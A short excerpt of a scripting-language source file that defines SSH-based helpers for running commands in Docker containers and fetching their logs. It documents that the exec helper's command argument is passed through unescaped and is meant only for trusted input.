// ---------------------------------------------------------------------------

// docker_exec(host, name, command) — run a command inside a running container.
// `command` is a TRUSTED-INPUT-ONLY raw-shell escape hatch (robustness review R28): it IS a
// command line and is passed through verbatim, with NO sh_quote()/escaping applied — unlike
// `name`, which IS quoted. Never build `command` from untrusted input, and keep secrets out of
// it (use ssh_exec_stdin / write_remote for those).
fn docker_exec(host, name, command) {
    ssh_exec(host, rt::container_cmd() + " exec " + sh_quote(name) + " " + command)
}

// ---------------------------------------------------------------------------
// Logs
// ---------------------------------------------------------------------------

// docker_logs(host, name, cfg) — recent logs from a container.  cfg: #{tail: 100}
fn docker_logs(host, name, cfg) {
    let tail = if cfg.contains("tail") { cfg.tail } else { 100 };
    ssh_exec(host, rt::container_cmd() + " logs --tail " + sh_quote("" + tail) + " " + sh_quote(name) + " 2>&1")
}

// docker_logs(host, name) — 2-arg overload (tail 100).
fn docker_logs(host, name) {
    docker_logs(host, name, #{})
}
